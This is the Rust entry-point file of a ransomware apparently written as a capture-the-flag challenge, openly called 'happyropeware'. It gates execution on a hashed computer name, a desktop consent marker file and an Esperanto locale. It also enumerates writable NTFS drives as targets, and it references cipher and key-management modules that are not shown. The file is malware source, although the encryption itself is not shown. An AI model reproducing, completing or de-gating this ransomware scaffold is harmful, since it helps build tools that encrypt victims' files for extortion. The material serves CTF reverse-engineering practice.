#![cfg_attr(not(test), windows_subsystem = "windows")]

mod cipher;
mod key_mgmt;

use anyhow::{bail, Result, anyhow};
use single_instance::SingleInstance;
use sys_locale::get_locale;
use widestring::U16CString;
use windows::Win32::Storage::FileSystem::{GetLogicalDrives, GetVolumeInformationW};
use windows::Win32::System::SystemServices::{FILE_NAMED_STREAMS, FILE_READ_ONLY_VOLUME};
use windows::w;
use windows::{Win32::System::WindowsProgramming::*, Win32::UI::WindowsAndMessaging::*};

// blake3::hash(b"the-victim-host-8deb7b96")
const EXPECTED_COMPUTER_NAME_HASH_HEX: &'static str =
    "7e199a3cd61f888b67bbc6eb5ea707bca51b6d5af06b39c2fb038426f1a17fe5";
const CONSENT_MARKER_FILE_NAME: &'static str = 
    "YesIKnowIAmRunningARealRansomwareTheDecryptionKeyWillOnlyBeReleasedAfterTheCTFEndsPleaseGoOn.txt";

fn get_computer_name() -> Result<String> {
    let mut size = 0;
    unsafe {
        GetComputerNameW(windows::core::PWSTR::null(), &mut size);
    }
    let mut buffer = Vec::with_capacity(size as usize);
    let bptr = windows::core::PWSTR::from_raw(buffer.as_mut_ptr());
    unsafe { GetComputerNameW(bptr, &mut size).ok()? };
    Ok(unsafe { bptr.to_string()? })
}

fn check_precondition() -> Result<()> {
    let computer_name = get_computer_name()?.to_ascii_lowercase();
    let computer_name_hash = blake3::hash(computer_name.as_bytes());
    let expected_hash: blake3::Hash = EXPECTED_COMPUTER_NAME_HASH_HEX.parse().unwrap();
    if computer_name_hash != expected_hash {
        bail!("computer name mismatches");
    }
    
    let user_dirs = directories::UserDirs::new().unwrap();
    let desktop = user_dirs.desktop_dir().ok_or(anyhow!("failed to find desktop"))?;
    if !desktop.join(CONSENT_MARKER_FILE_NAME).exists() {
        bail!("no consent marker found");
    }
    if get_locale().ok_or_else(|| anyhow::anyhow!("failed to get locale"))? != "eo-001" {
        bail!("locale mismatches");
    }
    Ok(())
}

fn assert_precondition() {
    if let Err(err) = check_precondition() {
        // msg_u16 MUST not be dropped before msg
        let msg_u16 = U16CString::from_str(format!(
            "Precondition check failed: {}\n\n\
            Please DO note that you are running a MALWARE specifically created for a CTF, \
            make sure you're debugging this in a sandboxed environment, do NOT blindly patch this out!\n\
            请注意：你正在运行一个恶意软件，请确保你在沙箱环境中调试，不要无脑去除这个检查！",
            err
        )).unwrap();
        let msg = windows::core::PCWSTR::from_raw(msg_u16.as_ptr());
        unsafe {
            MessageBoxW(None, msg, w!("Error"), MB_OK | MB_ICONERROR);
        }
        std::process::exit(0)
    }
}

fn get_all_suitable_drives() -> Vec<String> {
    let drive_mask = unsafe { GetLogicalDrives() };
    let mut result: Vec<String> = Vec::new();
    for i in 0..26 {
        if (drive_mask & (1 << i)) == 0 {
            continue
        }
        let drive = format!("{}:\\", (b'A' + i as u8) as char);
        // Call GetVolumeInformation to check the filesystem type
        let mut fs_type = [0u16; 16];
        let drive_u16 = U16CString::from_str(drive.clone()).unwrap();
        let drive_ptr = windows::core::PCWSTR::from_raw(drive_u16.as_ptr());
        let mut flags: u32 = 0;
        unsafe {
            if !GetVolumeInformationW(drive_ptr, None, None, None, Some(&mut flags), Some(&mut fs_type)).as_bool() {
                continue
            }
        }
        if fs_type[..5] != [b'N' as u16, b'T' as u16, b'F' as u16, b'S' as u16, 0] {
            continue
        }
        if (flags & FILE_READ_ONLY_VOLUME != 0) || (flags & FILE_NAMED_STREAMS == 0) {
            continue
        }
        result.push(drive)
    }
    result
}

fn main() {
    assert_precondition();
    let holder = SingleInstance::new("happyropeware-dc52184435e51deee395").unwrap();
    if !holder.is_single() {
        return
    }
}
